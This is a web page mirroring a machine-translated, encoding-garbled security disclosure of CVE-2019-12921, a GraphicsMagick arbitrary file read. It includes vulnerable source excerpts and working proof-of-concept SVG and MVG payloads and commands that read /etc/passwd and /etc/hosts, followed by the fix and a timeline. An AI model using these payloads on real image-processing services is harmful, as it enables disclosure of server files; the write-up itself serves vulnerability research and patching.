<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸˆ ğŸ˜¸ ğŸ‘„ æ‚²å‰§å¹¶ä¸å­¤å• ğŸ§˜ğŸ¼ ğŸ‘©â€ğŸ“ ğŸ™‹ğŸ½</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="2016å¹´ï¼ŒImageMagickä¸­çš„ImageTragickæ¼æ´å¼•èµ·äº†å¾ˆå¤§è½°åŠ¨ ã€‚ ä½œä¸ºé™ä½é£é™©çš„ä¸€ç§æ–¹æ³•ï¼Œå»ºè®®ä½¿ç”¨GraphicsMagickåº“çš„æ´¾ç”Ÿç±»GraphicsMagick ï¼Œå…¶ç›®çš„æ˜¯ä½¿APIæ›´åŠ ç¨³å®šå’Œé«˜æ•ˆã€‚ stewieå‘ç°çš„åŸå§‹æ¼æ´CVE-2016-3717ä½¿æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç‰¹åˆ¶æ˜ åƒè¯»...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>æ‚²å‰§å¹¶ä¸å­¤å•</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/wrike/blog/458926/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/cq/qt/va/cqqtvacmffwgveolv8ci-cebioo.png"></div><br><p>  2016å¹´ï¼ŒImageMagickä¸­çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ImageTragick</a>æ¼æ´å¼•èµ·äº†å¾ˆå¤§<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è½°åŠ¨</a> ã€‚ ä½œä¸ºé™ä½é£é™©çš„ä¸€ç§æ–¹æ³•ï¼Œå»ºè®®ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GraphicsMagick</a>åº“çš„æ´¾ç”Ÿç±»<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GraphicsMagick</a> ï¼Œå…¶ç›®çš„æ˜¯ä½¿APIæ›´åŠ ç¨³å®šå’Œé«˜æ•ˆã€‚  stewieå‘ç°çš„åŸå§‹æ¼æ´CVE-2016-3717ä½¿æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç‰¹åˆ¶æ˜ åƒè¯»å–æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ ä»Šå¤©ï¼Œæˆ‘å°†çœ‹çœ‹æˆ‘åœ¨åˆ†æåº“æºä»£ç æ—¶å‘ç°çš„GraphicsMagickä¸­çš„ç±»ä¼¼æ¼æ´ã€‚ </p><a name="habracut"></a><br><p> é€šè¿‡<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ImageTragick</a>ç«™ç‚¹çš„ä¼ª<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åè®®</a> â€œæ ‡ç­¾â€è¿›è¡Œçš„åŸå§‹åˆ©ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å°†</a>ä¸èµ·ä½œç”¨ã€‚ </p><br><pre><code class="plaintext hljs">push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@/etc/passwd' pop graphic-context</code> </pre> <br><p><img src="https://habrastorage.org/webt/pi/uy/pe/piuypewlfgrjyxsnz82hbpvk8ne.gif"></p><br><p> åŸå› æ˜¯render.c ReadImageæ–‡ä»¶çš„ImagePrimitiveå›¾åƒå¤„ç†ç®—æ³•æ— æ³•å°†æ ‡ç­¾å­—ç¬¦ä¸²ï¼š@ / etc / passwdä½œä¸ºå›¾åƒå¤„ç†ï¼Œå¹¶å°†è¿”å›â€œæ— æ³•æ‰“å¼€æ–‡ä»¶â€é”™è¯¯ã€‚ åŠŸèƒ½ç ï¼š </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> VALID_PREFIX(str,url) (LocaleNCompare(str,url,sizeof(str)-1) == 0) </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (!VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"http://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"https://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"ftp://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !(IsAccessibleNoLogging(primitive_info-&gt;text)) ) { ThrowException(&amp;image-&gt;exception,FileOpenError,UnableToOpenFile,primitive_info-&gt;text); status=MagickFail; }</span></span></code> </pre> <br><p> ä½†æ˜¯ï¼Œä»ç„¶å¯ä»¥è¯»å–æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•æ˜ åƒï¼Œä½†æ˜¯åªèƒ½ç”¨äºæ”¶é›†å†…éƒ¨ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨BugBountyç¨‹åºçš„æŠ¥å‘Šä¸­æ‰¾åˆ°æ­¤â€œåŠŸèƒ½â€çš„æ“ä½œç¤ºä¾‹ã€‚ <br> è¿™ä½¿æˆ‘è¯¦ç»†ç ”ç©¶äº†GraphicsMagickä¸­Labelç¼–è§£ç å™¨çš„å®ç°ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬æ‰§è¡Œè½¬æ¢ï¼š </p><br><pre> <code class="bash hljs">$ gm convert label:@etc/passwd output.png</code> </pre> <br><p> è¯¥åº“è¿”å›/ etc / passwdæ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œè¿™æ„å‘³ç€ä¼ªåè®®ä»ç„¶å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œä½†æ˜¯åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä¸é€‚åˆæ”»å‡»è€…ä½¿ç”¨ï¼Œå› ä¸ºä¸å¯èƒ½å½±å“å‘½ä»¤è¡Œã€‚ ä¸ºäº†äº†è§£å¦‚ä½•åˆ©ç”¨æ­¤â€œåŠŸèƒ½â€ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹åŸå› ã€‚ æ ‡ç­¾ä¼ªåè®®ä½¿ç”¨TranslateTextExå‡½æ•°è½¬æ¢å­—ç¬¦ä¸²ï¼š </p><br><pre> <code class="cpp hljs">text=(<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) formatted_text; <span class="hljs-comment"><span class="hljs-comment">/* If text starts with '@' then try to replace it with the content of the file name which follows. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((*text == <span class="hljs-string"><span class="hljs-string">'@'</span></span>) &amp;&amp; IsAccessible(text+<span class="hljs-number"><span class="hljs-number">1</span></span>)) { text=(<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) FileToBlob(text+<span class="hljs-number"><span class="hljs-number">1</span></span>,&amp;length,&amp;image-&gt;exception); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (text == (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); }</code> </pre> <br><p> è¯¥å‡½æ•°æ¥å—è¾“å…¥å‚æ•°formatted_textï¼Œå¦‚æœè¯¥è¡Œä»¥ç‰¹æ®Šå­—ç¬¦'@'å¼€å¤´ï¼Œåˆ™GMå°†å¦ä¸€è¡Œè§†ä¸ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œå¿…é¡»ä»è¯¥æ–‡ä»¶ä¸­è¯»å–è¦è½¬æ¢çš„å†…å®¹ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹ä½¿ç”¨æ­¤åŠŸèƒ½çš„å…¶ä»–åœ°æ–¹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½ã€‚ </p><br><ol><li>  /coders/msl.cä¼šå¤šæ¬¡å‡ºç°ï¼Œä½†æ˜¯GMä½¿ç”¨æ­¤è¯­è¨€ä½œä¸ºconjureå‘½ä»¤çš„è„šæœ¬è¯­è¨€ï¼Œå› æ­¤æœ¬æ–‡ä¸ä¼šè€ƒè™‘ï¼Œå¯ä»¥è¿›è¡Œæ“ä½œï¼Œä½†éœ€è¦ç‰¹å®šçš„åº”ç”¨ç¨‹åºé€»è¾‘ </li><li><p>  /magick/attribute.cå¤„ç†å›¾ç‰‡å±æ€§ã€‚ å½“æ³¨é‡Šå’Œæ ‡ç­¾å±æ€§ç”±ç”¨æˆ·ç›´æ¥ä¼ é€’è€Œä¸æ˜¯å­˜å‚¨åœ¨å›¾åƒæœ¬èº«ä¸­æ—¶ï¼Œå°†ä¸ºæ³¨é‡Šå’Œæ ‡ç­¾å±æ€§è°ƒç”¨TranslateTextå‡½æ•°ã€‚ å¼€å‘äººå‘˜ç»™æˆ‘ä»¬ä¸€ä¸ªå°æç¤ºï¼š </p><br><pre> <code class="plaintext hljs"> Translate format requests in attribute text when the blob is not open. This is really gross since it is assumed that the attribute is supplied by the user and the user intends for translation to occur. However, 'comment' and 'label' attributes may also come from an image file and may contain arbitrary text. As a crude-workaround, translations are only performed when the blob is not open.</code> </pre> <br><p> ä½†æ˜¯ï¼Œå¦‚æœåœ¨å…³é—­tog asï¼Œblobä¹‹åæ‰§è¡Œå›¾åƒçš„SetImageAttributeå‡½æ•°çš„å¤„ç†ï¼Œå°†ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ äº‹å®è¯æ˜ï¼Œæœ‰è¿™æ ·ä¸€ç§ç¼–è§£ç å™¨-SVGã€‚ å¯¹ReadSVGImageå‡½æ•°çš„è°ƒç”¨é“¾å¦‚ä¸‹ï¼š </p><br><ul><li>  XMLè§£æå™¨å…³é—­ </li><li>  CloseBlobï¼ˆå›¾åƒï¼‰å…³é—­Blob </li><li>  MVGä»£è¡¨æ‰§è¡Œè½¬æ¢ </li><li>  SetImageAttributeï¼ˆå›¾åƒï¼Œâ€œ commentâ€ï¼Œsvg_info.commentï¼‰çš„æ³¨é‡Šå’Œæ ‡é¢˜å±æ€§å°†è¢«å†™å…¥å›¾åƒã€‚ </li></ul><br></li></ol><br><p> ä¸ºäº†æˆåŠŸåˆ©ç”¨ï¼Œæ”»å‡»è€…éœ€è¦æœ€ç»ˆæ ¼å¼æ¥æ”¯æŒè¿™äº›å±æ€§ï¼Œä¾‹å¦‚GIFï¼ŒJPEGã€‚ </p><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--@/etc/passwd--&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"137px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"137px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">version</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2000/svg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span></span></span><span class="hljs-tag">= </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xlink"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xlink:href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">x</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">y</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100px"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre> <code class="bash hljs">$ gm convert exploit.svg output.gif $ gm convert exploit.svg output.jpeg</code> </pre> <br><p><img src="https://habrastorage.org/webt/6l/mx/m1/6lmxm1lvepbeyr9hgf3wbkompje.gif"></p><br><ol><li>  /magick/annotate.cä»¥ä¸‹æ˜¯åˆ©ç”¨AnnotateImageå‡½æ•°çš„å¥½é€‰æ‹©ï¼Œè¯¥å‡½æ•°è¢«ä½¿ç”¨ï¼š <br><ul><li>  /coders/txt.cç±»ä¼¼äºLablelä¼ªåè®®TXTåè®®ï¼šå®ƒæ²¡æœ‰ç‰¹åˆ«çš„æ„ä¹‰ï¼Œå› ä¸ºå®ƒçš„æ“ä½œéœ€è¦è®¿é—®å‘½ä»¤è¡Œã€‚ </li><li>  /magick/render.cè¿™æ˜¯æ–‡æœ¬<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Magick Vector Graphics</a>åŸè¯­çš„æœ€ç»ˆåˆ©ç”¨æ–¹æ³•ï¼Œè¯¥åŸè¯­å…·æœ‰ç›¸å½“ç®€å•çš„è¯­æ³•ï¼š </li></ul></li></ol><br><pre> <code class="plaintext hljs">text "text"</code> </pre> <br><p> å¦‚æœè¯¥è¡Œä»¥ç‰¹æ®Šå­—ç¬¦â€œ @â€å¼€å¤´ï¼Œåˆ™å¯èƒ½æˆåŠŸæ“ä½œã€‚ </p><br><pre> <code class="bash hljs">$ gm convert -size 800x900 xc:white -draw <span class="hljs-string"><span class="hljs-string">'text 20,30 "@/etc/hosts"'</span></span> foo.png</code> </pre> <br><p> è¿™ç§æ–¹æ³•åœ¨å®é™…åº”ç”¨ç¨‹åºä¸­å¾ˆå°‘è§ï¼Œä½†æ˜¯æœ‰ä¸€ç§ä½¿ç”¨å§”æ‰˜æ¥åˆ©ç”¨æ­¤æ¼æ´çš„æ–¹æ³•ã€‚ å§”æ‰˜æ˜¯ä¸€ä¸ªå¤–éƒ¨å›¾åƒå¤„ç†å™¨ï¼Œå…¶åº“ä¸æ”¯æŒå…¶æ ¼å¼ã€‚ æœ‰è®¸å¤šç¼–è§£ç å™¨å·²è½¬æ¢ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œå¹¶ä¸”MVGä¼ªåè®®æ‰§è¡Œäº†è¿›ä¸€æ­¥çš„å¤„ç†ã€‚ å¦‚å‰æ‰€è¿°ï¼Œæ­¤ç¼–è§£ç å™¨æ˜¯SVGã€‚ </p><br><h4 id="ekspluataciya-cve-2019-12921"> è¡ŒåŠ¨CVE-2019-12921 </h4><br><p>  XML Parser SVGå›¾åƒå°†æ ‡è®°è½¬æ¢ä¸ºä¸­é—´æ–‡ä»¶ï¼š </p><br><pre> <code class="cpp hljs">FormatString(clone_info-&gt;filename,â€mvg:%<span class="hljs-number"><span class="hljs-number">.1024</span></span>s<span class="hljs-string"><span class="hljs-string">",filename);</span></span></code> </pre> <br><p>  imgæ ‡è®°è½¬æ¢å…·æœ‰ä»¥ä¸‹ä»£ç ï¼š </p><br><pre> <code class="cpp hljs"> <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'i'</span></span>: { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (LocaleCompare((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) name,<span class="hljs-string"><span class="hljs-string">"image"</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>) { MVGPrintf(svg_info-&gt;file,<span class="hljs-string"><span class="hljs-string">"image Copy %g,%g %g,%g '%s'\n"</span></span>, svg_info-&gt;bounds.x,svg_info-&gt;bounds.y,svg_info-&gt;bounds.width, svg_info-&gt;bounds.height,svg_info-&gt;url); MVGPrintf(svg_info-&gt;file,<span class="hljs-string"><span class="hljs-string">"pop graphic-context\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; }</code> </pre> <br><p> ä¸ºäº†è¿›è¡Œåˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ç”¨é€šå¸¸çš„å¼•å·å°†å­—ç¬¦ä¸²çš„ä¸Šä¸‹æ–‡ç ´åå¹¶æ·»åŠ æˆ‘ä»¬çš„åˆ©ç”¨ï¼š </p><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">version</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2000/svg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span></span></span><span class="hljs-tag">= </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xlink"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xlink:href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/etc/favicon.png' text 0,0 '@/etc/passwd"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">x</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">y</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre> <code class="bash hljs">$ gm convert exploit.svg output.png</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">æœ€ç»ˆå½±åƒ</b> <div class="spoiler_text"><p><img src="https://habrastorage.org/webt/9d/hn/ro/9dhnrotg3je3c4r7xqzesmfc0dc.png"></p></div></div><br><p> ä½¿ç”¨MVGå§”æ‰˜å¯¹å…¶ä»–ç¼–è§£ç å™¨çš„æ“ä½œå°†ç”±è¯»è€…è‡ªè¡Œå†³å®šã€‚ </p><br><h4 id="zaschita"> é˜²æŠ¤ç­‰çº§ </h4><br><p>  GMçš„æ›´æ–°ç‰ˆæœ¬å¯åœ¨åˆ¶é€ å•†çš„ç½‘ç«™ä¸Šæ‰¾åˆ°ã€‚ è¯¥ä¿®å¤ç¨‹åºæ­¤åˆ»åˆ é™¤äº†å¸¦æœ‰ç‰¹æ®Š@ç¬¦å·çš„æ–‡ä»¶æ”¯æŒï¼ŒMercurialå˜æ›´é›†16037ï¼šf780c290b4abå’Œ16038ï¼š44e3d0e872ebç”¨äºTranslateTextExå‡½æ•°ã€‚ æ ¹æ®å¼€å‘äººå‘˜çš„è¯´æ³•ï¼Œå°†æ¥ï¼Œæ­¤é€»è¾‘å°†åœ¨æ›´å®‰å…¨çš„å®ç°ä¸­è¿”å›ã€‚ è§£å†³æ–¹æ³•æ˜¯ï¼Œå»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡MAGICK_CODER_STABILITY = PRIMARY </p><br><h4 id="timeline"> æ—¶é—´è¡¨ </h4><br><p> æœ‰å…³è¯¥æ¼æ´çš„ä¿¡æ¯å·²äº2019å¹´6æœˆ6æ—¥è½¬ç§»åˆ°å¼€å‘äººå‘˜ï¼Œå½“å¤©æ™šäº›æ—¶å€™å‘å¸ƒäº†ä¸€ä¸ªä¿®è¡¥ç¨‹åºã€‚  2019å¹´6æœˆ15æ—¥ï¼Œåœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">www.openwall.comä¸Š</a>å‘å¸ƒäº†ä¸€å°å‚è€ƒä¿¡ã€‚ åœ¨2019å¹´6æœˆ20æ—¥ï¼ŒCVE-2019-12921è¢«åˆ†é…ç»™æ­¤é—®é¢˜ã€‚ </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN458926/">https://habr.com/ru/post/zh-CN458926/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN458916/index.html">åœ¨Reactçš„å¹•å æˆ‘ä»¬ä»å¤´å¼€å§‹ç¼–å†™å®ç°</a></li>
<li><a href="../zh-CN458918/index.html">æ‚¨å¯ä»¥ä»è¶…ä¼‘é—²æ¸¸æˆçš„è®¾è®¡ä¸­å­¦åˆ°ä»€ä¹ˆ</a></li>
<li><a href="../zh-CN458920/index.html">DevOpsç²‰ä¸å¤§ä¼š</a></li>
<li><a href="../zh-CN458922/index.html">å¦‚ä½•ä»ESXiè¿ç§»åˆ°KVM / LXDè€Œä¸å¤±ä¸»æ„</a></li>
<li><a href="../zh-CN458924/index.html">äº‹æ•…å¯ä»¥å¸®åŠ©æ‚¨å­¦ä¹ </a></li>
<li><a href="../zh-CN458928/index.html">XLNetä¸BERT</a></li>
<li><a href="../zh-CN458930/index.html">å½¼å°”å§†å­¦ç”Ÿå¦‚ä½•è¿›å…¥2019å¹´æ•°æ®æŒ–æ˜æ¯å›½é™…æ•°æ®åˆ†æå† å†›èµ›çš„å†³èµ›</a></li>
<li><a href="../zh-CN458932/index.html">Yota-æˆ–å¦‚ä½•æŸ¥æ‰¾æ‰€æœ‰å†…å®¹</a></li>
<li><a href="../zh-CN458934/index.html">ä½¿ç”¨Helmåœ¨å¤šä¸ªKubernetesé›†ç¾¤ä¸Šéƒ¨ç½²åº”ç”¨ç¨‹åº</a></li>
<li><a href="../zh-CN458936/index.html">â€œå›ç­”è¦æ¯”ä¿æŒæ²‰é»˜æ›´å®¹æ˜“â€-äº¤æ˜“è®°å¿†ä¹‹çˆ¶Maurice Herlichiçš„ä¸€æ¬¡å¤§å‹è®¿è°ˆ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
